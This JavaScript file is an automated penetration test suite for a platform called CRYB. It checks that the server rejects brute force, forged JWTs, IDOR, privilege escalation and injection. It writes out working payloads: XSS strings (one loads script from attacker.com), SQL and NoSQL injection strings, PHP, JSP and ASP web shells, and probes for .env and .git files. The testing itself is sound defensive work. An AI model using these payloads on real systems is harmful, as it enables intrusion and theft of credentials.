// Comprehensive Penetration Testing Suite for CRYB Platform
const { test, expect } = require('@playwright/test');
const axios = require('axios');
const crypto = require('crypto');

const BASE_URL = process.env.BASE_URL || 'http://localhost:3000';
const WEB_URL = process.env.WEB_URL || 'http://localhost:3001';

describe('Penetration Testing Suite', () => {
  let authToken = '';
  let adminToken = '';
  
  test.beforeAll(async () => {
    // Setup test authentication
    try {
      const userResponse = await axios.post(`${BASE_URL}/api/auth/login`, {
        email: 'testuser1@example.com',
        password: 'TestPassword123!',
      });
      authToken = userResponse.data.token;

      const adminResponse = await axios.post(`${BASE_URL}/api/auth/login`, {
        email: 'admin@example.com',
        password: 'AdminPassword123!',
      });
      adminToken = adminResponse.data.token;
    } catch (error) {
      console.warn('Authentication setup failed:', error.message);
    }
  });

  describe('Authentication Security Tests', () => {
    test('should test brute force protection', async () => {
      const targetEmail = 'testuser1@example.com';
      const failedAttempts = [];
      
      // Attempt brute force attack
      for (let i = 0; i < 15; i++) {
        try {
          const response = await axios.post(`${BASE_URL}/api/auth/login`, {
            email: targetEmail,
            password: `wrongpassword${i}`,
          });
          
          failedAttempts.push({ attempt: i, status: response.status });
        } catch (error) {
          failedAttempts.push({ 
            attempt: i, 
            status: error.response?.status,
            message: error.response?.data?.message 
          });
        }
        
        // Small delay to simulate real attack
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      
      // Should implement protection after several attempts
      const rateLimitedAttempts = failedAttempts.filter(
        attempt => attempt.status === 429 || 
                  attempt.message?.toLowerCase().includes('rate limit') ||
                  attempt.message?.toLowerCase().includes('too many')
      );
      
      expect(rateLimitedAttempts.length).toBeGreaterThan(0);
      console.log(`Rate limiting kicked in after ${rateLimitedAttempts.length} attempts`);
    });

    test('should test session hijacking resistance', async () => {
      if (!authToken) return;

      // Test 1: Token reuse from different IP simulation
      const originalUserAgent = 'Mozilla/5.0 (Test Browser)';
      const suspiciousUserAgent = 'curl/7.68.0';
      
      try {
        // Normal request
        const response1 = await axios.get(`${BASE_URL}/api/users/me`, {
          headers: { 
            Authorization: `Bearer ${authToken}`,
            'User-Agent': originalUserAgent,
          },
        });
        
        // Suspicious request with different user agent
        const response2 = await axios.get(`${BASE_URL}/api/users/me`, {
          headers: { 
            Authorization: `Bearer ${authToken}`,
            'User-Agent': suspiciousUserAgent,
          },
        });
        
        // Both should work unless advanced session protection is implemented
        expect([200, 401, 403]).toContain(response1.status);
        expect([200, 401, 403]).toContain(response2.status);
      } catch (error) {
        // Expected if strong session protection is in place
      }
    });

    test('should test JWT vulnerabilities', async () => {
      if (!authToken) return;

      const tokenParts = authToken.split('.');
      expect(tokenParts).toHaveLength(3);

      // Test 1: None algorithm attack
      const header = {
        alg: 'none',
        typ: 'JWT'
      };
      const payload = JSON.parse(Buffer.from(tokenParts[1], 'base64').toString());
      
      const noneToken = Buffer.from(JSON.stringify(header)).toString('base64').replace(/=/g, '') +
                       '.' +
                       Buffer.from(JSON.stringify(payload)).toString('base64').replace(/=/g, '') +
                       '.';
      
      try {
        const response = await axios.get(`${BASE_URL}/api/users/me`, {
          headers: { Authorization: `Bearer ${noneToken}` },
        });
        
        // Should reject 'none' algorithm
        expect(response.status).not.toBe(200);
      } catch (error) {
        expect([401, 403]).toContain(error.response?.status);
      }

      // Test 2: Modified payload
      const modifiedPayload = { ...payload, role: 'admin', isAdmin: true };
      const modifiedToken = tokenParts[0] + 
                           '.' + 
                           Buffer.from(JSON.stringify(modifiedPayload)).toString('base64').replace(/=/g, '') +
                           '.' +
                           tokenParts[2];
      
      try {
        const response = await axios.get(`${BASE_URL}/api/users/me`, {
          headers: { Authorization: `Bearer ${modifiedToken}` },
        });
        
        // Should reject modified token
        expect(response.status).not.toBe(200);
      } catch (error) {
        expect([401, 403]).toContain(error.response?.status);
      }
    });

    test('should test password reset vulnerabilities', async () => {
      // Test 1: Password reset token prediction
      const resetTokens = [];
      
      for (let i = 0; i < 5; i++) {
        try {
          await axios.post(`${BASE_URL}/api/auth/forgot-password`, {
            email: `testuser${i}@example.com`,
          });
          
          // In a real test, you'd intercept emails to get tokens
          // Here we just verify the endpoint doesn't crash
        } catch (error) {
          // Expected for non-existent users
        }
      }
      
      // Test 2: Password reset without proper authorization
      const fakeResetToken = crypto.randomBytes(32).toString('hex');
      
      try {
        const response = await axios.post(`${BASE_URL}/api/auth/reset-password`, {
          token: fakeResetToken,
          password: 'NewHackedPassword123!',
        });
        
        // Should reject invalid token
        expect(response.status).not.toBe(200);
      } catch (error) {
        expect([400, 401, 403]).toContain(error.response?.status);
      }
    });
  });

  describe('Authorization Security Tests', () => {
    test('should test privilege escalation vulnerabilities', async () => {
      if (!authToken) return;

      // Test 1: Direct role modification
      const escalationAttempts = [
        {
          endpoint: '/api/users/me',
          method: 'put',
          data: { role: 'admin' },
          description: 'Direct role assignment'
        },
        {
          endpoint: '/api/users/me',
          method: 'patch',
          data: { permissions: ['admin:all'] },
          description: 'Permission escalation'
        },
        {
          endpoint: '/api/admin/users/1/promote',
          method: 'post',
          data: {},
          description: 'Admin promotion endpoint'
        },
      ];

      for (const attempt of escalationAttempts) {
        try {
          const response = await axios[attempt.method](`${BASE_URL}${attempt.endpoint}`, attempt.data, {
            headers: { Authorization: `Bearer ${authToken}` },
          });
          
          console.log(`${attempt.description}: ${response.status}`);
          
          // Should not allow privilege escalation
          if (response.status === 200) {
            expect(response.data.role).not.toBe('admin');
            expect(response.data.isAdmin).not.toBe(true);
          }
        } catch (error) {
          // Expected to fail
          expect([401, 403, 404, 405]).toContain(error.response?.status);
        }
      }
    });

    test('should test insecure direct object references (IDOR)', async () => {
      if (!authToken) return;

      // Test access to other users' data
      const idorTests = [
        { endpoint: '/api/users/2', description: 'Other user profile' },
        { endpoint: '/api/users/admin/settings', description: 'Admin settings' },
        { endpoint: '/api/posts/1/edit', description: 'Edit other user post' },
        { endpoint: '/api/notifications?userId=2', description: 'Other user notifications' },
        { endpoint: '/api/messages/private/1', description: 'Private messages' },
      ];

      for (const test of idorTests) {
        try {
          const response = await axios.get(`${BASE_URL}${test.endpoint}`, {
            headers: { Authorization: `Bearer ${authToken}` },
          });
          
          console.log(`${test.description}: ${response.status}`);
          
          // Should not allow unauthorized access
          if (response.status === 200) {
            // Check if response contains sensitive data that shouldn't be accessible
            expect(response.data.password).toBeUndefined();
            expect(response.data.email).toBeUndefined();
          }
        } catch (error) {
          // Expected to fail for unauthorized access
          expect([401, 403, 404]).toContain(error.response?.status);
        }
      }
    });

    test('should test horizontal privilege escalation', async () => {
      if (!authToken) return;

      // Attempt to modify other users' data
      const horizontalTests = [
        {
          endpoint: '/api/users/2',
          method: 'put',
          data: { displayName: 'Hacked Name' },
          description: 'Modify other user profile'
        },
        {
          endpoint: '/api/posts/1',
          method: 'delete',
          data: {},
          description: 'Delete other user post'
        },
        {
          endpoint: '/api/comments/1',
          method: 'put',
          data: { content: 'Hacked comment' },
          description: 'Modify other user comment'
        },
      ];

      for (const test of horizontalTests) {
        try {
          const response = await axios[test.method](`${BASE_URL}${test.endpoint}`, test.data, {
            headers: { Authorization: `Bearer ${authToken}` },
          });
          
          console.log(`${test.description}: ${response.status}`);
          
          // Should not allow unauthorized modifications
          expect([401, 403, 404]).toContain(response.status);
        } catch (error) {
          expect([401, 403, 404]).toContain(error.response?.status);
        }
      }
    });
  });

  describe('Input Validation Security Tests', () => {
    test('should test for advanced XSS vulnerabilities', async ({ page }) => {
      if (!authToken) return;

      const advancedXSSPayloads = [
        // Event handler XSS
        '<img src=x onerror="fetch(\'/api/users/me?xss=1\')" />',
        '<svg onload="document.cookie=\'xss=true\'" />',
        
        // DOM-based XSS
        '<iframe src="javascript:parent.postMessage({type:\'xss\',data:document.cookie},\'*\')" />',
        
        // CSS-based XSS
        '<style>@import"javascript:alert(\'CSS XSS\')";</style>',
        
        // Filter bypass attempts
        '<SCRiPT>alert("XSS")</SCRiPT>',
        '<<SCRIPT>alert("XSS");//<</SCRIPT>',
        '<SCRIPT SRC=http://attacker.com/xss.js></SCRIPT>',
      ];

      // Login to web interface
      await page.goto(`${WEB_URL}/login`);
      await page.fill('[data-testid="email-input"]', 'testuser1@example.com');
      await page.fill('[data-testid="password-input"]', 'TestPassword123!');
      await page.click('[data-testid="login-button"]');

      for (const payload of advancedXSSPayloads) {
        try {
          await page.goto(`${WEB_URL}/submit`);
          
          await page.fill('[data-testid="post-title-input"]', `XSS Test: ${payload}`);
          await page.fill('[data-testid="post-content-input"]', payload);
          
          await page.click('[data-testid="submit-post-button"]');
          
          // Wait a moment for any XSS to execute
          await page.waitForTimeout(500);
          
          // Check for XSS execution
          const dialogPromise = page.waitForEvent('dialog', { timeout: 1000 }).catch(() => null);
          const dialog = await dialogPromise;
          
          if (dialog) {
            console.error(`XSS vulnerability found with payload: ${payload}`);
            await dialog.dismiss();
            expect(dialog).toBeNull(); // This will fail, indicating XSS vulnerability
          }
          
          // Check for fetch requests (for advanced payloads)
          const requests = [];
          page.on('request', request => {
            if (request.url().includes('xss=1')) {
              requests.push(request.url());
            }
          });
          
          expect(requests.length).toBe(0);
          
        } catch (error) {
          // Continue with next payload
        }
      }
    });

    test('should test for SQL injection in complex scenarios', async () => {
      if (!authToken) return;

      const complexSQLPayloads = [
        // Time-based blind SQL injection
        "'; WAITFOR DELAY '00:00:05' --",
        "' OR SLEEP(5) --",
        
        // Boolean-based blind SQL injection
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
        "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a' --",
        
        // Union-based SQL injection
        "' UNION SELECT username,password,email,null FROM users --",
        "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12 --",
        
        // Error-based SQL injection
        "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version()))) --",
        "' AND (SELECT COUNT(*) FROM information_schema.tables) --",
      ];

      const testEndpoints = [
        { url: '/api/search', param: 'q' },
        { url: '/api/users', param: 'username' },
        { url: '/api/posts', param: 'category' },
        { url: '/api/comments', param: 'postId' },
      ];

      for (const endpoint of testEndpoints) {
        for (const payload of complexSQLPayloads) {
          try {
            const startTime = Date.now();
            
            const response = await axios.get(`${BASE_URL}${endpoint.url}`, {
              params: { [endpoint.param]: payload },
              headers: { Authorization: `Bearer ${authToken}` },
              timeout: 10000, // 10 second timeout
            });
            
            const responseTime = Date.now() - startTime;
            
            // Check for time-based injection (delayed response)
            if (responseTime > 4000) {
              console.warn(`Potential time-based SQL injection at ${endpoint.url} with payload: ${payload}`);
            }
            
            // Check for error-based injection
            if (response.data && typeof response.data === 'string') {
              const errorKeywords = ['sql', 'mysql', 'postgresql', 'oracle', 'syntax error', 'column', 'table'];
              const hasError = errorKeywords.some(keyword => 
                response.data.toLowerCase().includes(keyword)
              );
              
              if (hasError) {
                console.warn(`Potential error-based SQL injection at ${endpoint.url}`);
              }
            }
            
            // Check for union-based injection (unexpected data structure)
            if (response.data && Array.isArray(response.data) && response.data.length > 0) {
              const firstItem = response.data[0];
              if (firstItem && typeof firstItem === 'object') {
                const keys = Object.keys(firstItem);
                if (keys.includes('password') || keys.includes('email')) {
                  console.warn(`Potential data exposure at ${endpoint.url}`);
                }
              }
            }
            
          } catch (error) {
            // Check error messages for SQL-related information
            if (error.response?.data) {
              const errorMessage = JSON.stringify(error.response.data).toLowerCase();
              if (errorMessage.includes('sql') || errorMessage.includes('database')) {
                console.warn(`SQL error disclosure at ${endpoint.url}: ${errorMessage}`);
              }
            }
          }
        }
      }
    });

    test('should test NoSQL injection vulnerabilities', async () => {
      if (!authToken) return;

      const noSQLPayloads = [
        // MongoDB injection
        { username: { $ne: null }, password: { $ne: null } },
        { username: { $gt: "" }, password: { $gt: "" } },
        { username: { $regex: ".*" }, password: { $regex: ".*" } },
        { $where: "function() { return true; }" },
        { username: { $in: ["admin", "administrator", "root"] } },
        
        // JavaScript injection in MongoDB
        { username: "admin'; return true; var dummy='", password: "anything" },
        { $where: "this.username == 'admin' || true" },
      ];

      for (const payload of noSQLPayloads) {
        try {
          const response = await axios.post(`${BASE_URL}/api/auth/login`, payload);
          
          // Should not authenticate with NoSQL injection
          expect(response.status).not.toBe(200);
          
          if (response.status === 200) {
            console.error('NoSQL injection vulnerability detected!', payload);
          }
        } catch (error) {
          // Expected to fail
          expect([400, 401, 422]).toContain(error.response?.status);
        }
      }
    });

    test('should test file upload vulnerabilities', async () => {
      if (!authToken) return;

      const maliciousFiles = [
        // PHP webshell
        {
          name: 'shell.php',
          content: '<?php system($_GET["cmd"]); ?>',
          type: 'application/x-php'
        },
        
        // JSP webshell
        {
          name: 'shell.jsp',
          content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
          type: 'application/x-jsp'
        },
        
        // ASP webshell
        {
          name: 'shell.asp',
          content: '<%eval request("cmd")%>',
          type: 'application/x-asp'
        },
        
        // Executable disguised as image
        {
          name: 'image.jpg.exe',
          content: 'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff',
          type: 'image/jpeg'
        },
        
        // SVG with XSS
        {
          name: 'image.svg',
          content: '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>',
          type: 'image/svg+xml'
        },
        
        // ZIP bomb (small file that extracts to huge size)
        {
          name: 'bomb.zip',
          content: 'PK\x03\x04' + 'A'.repeat(1000),
          type: 'application/zip'
        },
      ];

      for (const file of maliciousFiles) {
        try {
          const formData = new FormData();
          formData.append('file', new Blob([file.content], { type: file.type }), file.name);
          
          const response = await axios.post(`${BASE_URL}/api/uploads`, formData, {
            headers: {
              'Authorization': `Bearer ${authToken}`,
              'Content-Type': 'multipart/form-data',
            },
          });
          
          console.log(`File upload test for ${file.name}: ${response.status}`);
          
          // Should reject malicious files
          if (response.status === 201 || response.status === 200) {
            // Check if file was properly validated
            if (file.name.includes('.php') || file.name.includes('.jsp') || file.name.includes('.asp')) {
              console.warn(`Potentially dangerous file ${file.name} was accepted`);
            }
            
            // Verify file is not executable
            if (response.data.url) {
              try {
                const fileResponse = await axios.get(response.data.url);
                expect(fileResponse.headers['content-type']).not.toMatch(/php|jsp|asp/);
              } catch (error) {
                // File not accessible, which is good for security
              }
            }
          }
        } catch (error) {
          // Expected for malicious files
          expect([400, 413, 415, 422]).toContain(error.response?.status);
        }
      }
    });
  });

  describe('Business Logic Security Tests', () => {
    test('should test for business logic flaws', async () => {
      if (!authToken) return;

      // Test 1: Race condition in voting
      const postId = 'test-post-1';
      const votePromises = [];
      
      for (let i = 0; i < 10; i++) {
        votePromises.push(
          axios.post(`${BASE_URL}/api/posts/${postId}/vote`, 
            { direction: 'up' },
            { headers: { Authorization: `Bearer ${authToken}` } }
          ).catch(e => e.response)
        );
      }
      
      const voteResponses = await Promise.all(votePromises);
      const successfulVotes = voteResponses.filter(r => r.status === 200);
      
      // Should only allow one vote per user
      expect(successfulVotes.length).toBeLessThanOrEqual(1);

      // Test 2: Negative quantities/amounts
      const negativeValueTests = [
        {
          endpoint: '/api/posts',
          data: { title: 'Test', content: 'Test', votes: -1000 },
        },
        {
          endpoint: '/api/users/me',
          data: { karma: -999999 },
        },
      ];

      for (const test of negativeValueTests) {
        try {
          const response = await axios.post(`${BASE_URL}${test.endpoint}`, test.data, {
            headers: { Authorization: `Bearer ${authToken}` },
          });
          
          // Should validate business rules
          if (response.status === 200 || response.status === 201) {
            expect(response.data.votes).toBeGreaterThanOrEqual(0);
            expect(response.data.karma).toBeGreaterThanOrEqual(0);
          }
        } catch (error) {
          // Expected to fail validation
        }
      }

      // Test 3: Time manipulation
      const futureDate = new Date(Date.now() + 86400000).toISOString(); // Tomorrow
      
      try {
        const response = await axios.post(`${BASE_URL}/api/posts`, {
          title: 'Future Post',
          content: 'This post is from the future',
          createdAt: futureDate,
        }, {
          headers: { Authorization: `Bearer ${authToken}` },
        });
        
        if (response.status === 201) {
          // Should not allow future dates
          expect(new Date(response.data.createdAt).getTime()).toBeLessThanOrEqual(Date.now());
        }
      } catch (error) {
        // Expected to fail validation
      }
    });

    test('should test for workflow bypass vulnerabilities', async () => {
      if (!authToken) return;

      // Test 1: Skip moderation workflow
      const bypassTests = [
        {
          endpoint: '/api/posts',
          data: { 
            title: 'Bypass Test', 
            content: 'Test content',
            status: 'published',
            approved: true,
            moderatedBy: 'admin'
          },
        },
        {
          endpoint: '/api/users/me/verify',
          data: { verified: true },
        },
        {
          endpoint: '/api/posts/1/approve',
          data: { approved: true },
        },
      ];

      for (const test of bypassTests) {
        try {
          const response = await axios.post(`${BASE_URL}${test.endpoint}`, test.data, {
            headers: { Authorization: `Bearer ${authToken}` },
          });
          
          console.log(`Workflow bypass test ${test.endpoint}: ${response.status}`);
          
          // Should not allow unauthorized workflow modifications
          if (response.status === 200 || response.status === 201) {
            expect(response.data.approved).not.toBe(true);
            expect(response.data.verified).not.toBe(true);
          }
        } catch (error) {
          // Expected to fail
          expect([401, 403, 404, 405]).toContain(error.response?.status);
        }
      }
    });
  });

  describe('API Security Tests', () => {
    test('should test for API versioning vulnerabilities', async () => {
      const versionTests = [
        '/v1/api/users/me',
        '/api/v1/users/me',
        '/api/v2/users/me',
        '/api/beta/users/me',
        '/api/internal/users/me',
        '/api/admin/users/me',
      ];

      for (const endpoint of versionTests) {
        try {
          const response = await axios.get(`${BASE_URL}${endpoint}`, {
            headers: { Authorization: `Bearer ${authToken}` },
          });
          
          console.log(`API version test ${endpoint}: ${response.status}`);
          
          if (response.status === 200) {
            // Check if old versions expose more data
            expect(response.data.password).toBeUndefined();
            expect(response.data.email).toBeUndefined();
          }
        } catch (error) {
          // Most should fail
        }
      }
    });

    test('should test for HTTP verb tampering', async () => {
      if (!authToken) return;

      // Test different HTTP methods on same endpoint
      const methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS'];
      const testEndpoint = '/api/users/me';

      for (const method of methods) {
        try {
          const response = await axios({
            method: method.toLowerCase(),
            url: `${BASE_URL}${testEndpoint}`,
            headers: { Authorization: `Bearer ${authToken}` },
            data: method !== 'GET' ? { test: 'data' } : undefined,
          });
          
          console.log(`HTTP ${method} on ${testEndpoint}: ${response.status}`);
          
          // Verify proper method handling
          if (method === 'DELETE' && response.status === 200) {
            console.warn('DELETE method unexpectedly succeeded on user profile');
          }
        } catch (error) {
          // Expected for unauthorized methods
        }
      }
    });

    test('should test for GraphQL injection (if applicable)', async () => {
      // Test if GraphQL endpoint exists
      const graphQLEndpoints = ['/graphql', '/api/graphql', '/v1/graphql'];
      
      for (const endpoint of graphQLEndpoints) {
        try {
          const response = await axios.post(`${BASE_URL}${endpoint}`, {
            query: '{ __schema { types { name } } }'
          }, {
            headers: { 
              Authorization: `Bearer ${authToken}`,
              'Content-Type': 'application/json'
            },
          });
          
          if (response.status === 200) {
            console.log('GraphQL endpoint found, testing introspection...');
            
            // Should not allow introspection in production
            if (process.env.NODE_ENV === 'production') {
              expect(response.data.data.__schema).toBeUndefined();
            }
            
            // Test for injection
            const injectionQuery = `{
              users(where: "1=1") {
                id
                email
                password
              }
            }`;
            
            const injectionResponse = await axios.post(`${BASE_URL}${endpoint}`, {
              query: injectionQuery
            }, {
              headers: { Authorization: `Bearer ${authToken}` },
            });
            
            if (injectionResponse.data.data?.users) {
              // Should not expose sensitive fields
              injectionResponse.data.data.users.forEach(user => {
                expect(user.password).toBeUndefined();
                expect(user.email).toBeUndefined();
              });
            }
          }
        } catch (error) {
          // GraphQL endpoint may not exist
        }
      }
    });
  });

  describe('Infrastructure Security Tests', () => {
    test('should test for information disclosure', async () => {
      const infoDisclosureTests = [
        '/.env',
        '/.git/config',
        '/package.json',
        '/config.json',
        '/swagger.json',
        '/api-docs',
        '/docs',
        '/debug',
        '/server-status',
        '/phpinfo.php',
        '/robots.txt',
        '/.well-known/security.txt',
      ];

      for (const path of infoDisclosureTests) {
        try {
          const response = await axios.get(`${BASE_URL}${path}`);
          
          console.log(`Info disclosure test ${path}: ${response.status}`);
          
          if (response.status === 200) {
            // Check if sensitive information is exposed
            const content = JSON.stringify(response.data).toLowerCase();
            
            const sensitiveKeywords = [
              'password', 'secret', 'key', 'token', 'database',
              'mongodb', 'mysql', 'postgresql', 'redis'
            ];
            
            const hasSensitiveInfo = sensitiveKeywords.some(keyword => 
              content.includes(keyword)
            );
            
            if (hasSensitiveInfo && path !== '/robots.txt') {
              console.warn(`Potential sensitive information disclosure at ${path}`);
            }
          }
        } catch (error) {
          // Expected for most paths
        }
      }
    });

    test('should test for subdomain takeover vulnerabilities', async () => {
      // Test common subdomain patterns
      const subdomains = ['api', 'admin', 'test', 'staging', 'dev', 'www'];
      const baseHostname = new URL(BASE_URL).hostname;
      
      for (const subdomain of subdomains) {
        const testUrl = `http://${subdomain}.${baseHostname}`;
        
        try {
          const response = await axios.get(testUrl, { timeout: 5000 });
          console.log(`Subdomain test ${testUrl}: ${response.status}`);
          
          // Check for signs of takeover
          const content = response.data?.toString().toLowerCase() || '';
          const takeoverSignatures = [
            'this domain is for sale',
            'page not found',
            'domain expired',
            'parked domain'
          ];
          
          const hasTakeoverSign = takeoverSignatures.some(sig => content.includes(sig));
          if (hasTakeoverSign) {
            console.warn(`Potential subdomain takeover risk: ${testUrl}`);
          }
        } catch (error) {
          // Expected for non-existent subdomains
        }
      }
    });
  });
});